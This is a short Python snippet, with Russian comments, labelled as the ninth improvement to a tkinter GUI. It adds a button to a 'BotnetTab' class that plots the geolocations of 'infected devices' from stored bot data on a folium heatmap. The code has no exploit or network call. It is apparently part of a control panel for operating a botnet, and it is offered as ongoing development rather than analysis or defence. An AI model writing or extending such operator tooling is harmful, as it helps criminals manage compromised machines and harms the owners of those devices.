# ... все прежние импорты плюс:
import folium
import webbrowser

# Улучшение №9: Тепловая карта заражённых устройств
class BotnetTab(tk.Frame):
    def __init__(self, parent):
        # ...
        self.heatmap_btn = tk.Button(self, text='Тепловая карта', command=self.show_heatmap)
        self.heatmap_btn.pack()

    def show_heatmap(self):
        # Собираем геолокации из bots.json (нужно добавить поле location)
        locations = []
        for bot in self.bot_data:
            lat, lon = bot.get('lat'), bot.get('lon')
            if lat and lon:
                locations.append((lat, lon))
        if not locations:
            tk.messagebox.showinfo('Карта', 'Нет данных о местоположении')
            return

        m = folium.Map(location=[0, 0], zoom_start=2)
        for lat, lon in locations:
            folium.CircleMarker([lat, lon], radius=5, color='red').add_to(m)
        m.save('heatmap.html')
        webbrowser.open('heatmap.html')
